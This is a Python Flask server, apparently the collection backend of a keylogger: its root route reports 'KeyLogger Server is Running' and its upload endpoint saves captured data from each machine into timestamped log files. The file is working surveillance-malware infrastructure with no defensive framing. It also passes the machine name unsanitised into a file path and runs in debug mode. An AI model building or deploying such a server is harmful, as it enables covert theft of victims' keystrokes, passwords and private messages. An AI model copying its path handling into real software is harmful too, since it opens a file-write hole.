from flask import Flask, jsonify, request
import time
import os
import logging

app = Flask(__name__)
DATA_FOLDER = "data"
os.makedirs(DATA_FOLDER, exist_ok=True)

# הגדרת הלוגים
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)


def generate_log_filename() -> str:
    return f"log_{int(time.time())}.txt"


@app.route('/')
def home():
    return "KeyLogger Server is Running"


@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()
    if not data or not all(k in data for k in ("machine", "data")):
        logging.warning("Payload dont work: %s", data)
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine"]
    machine_folder = os.path.join(DATA_FOLDER, machine)
    os.makedirs(machine_folder, exist_ok=True)

    file_path = os.path.join(machine_folder, generate_log_filename())
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(data["data"])

    logging.info("new file save in machin '%s': %s", machine, file_path)

    return jsonify({"status": "success", "file": file_path}), 200


if __name__ == '__main__':
    app.run(debug=True)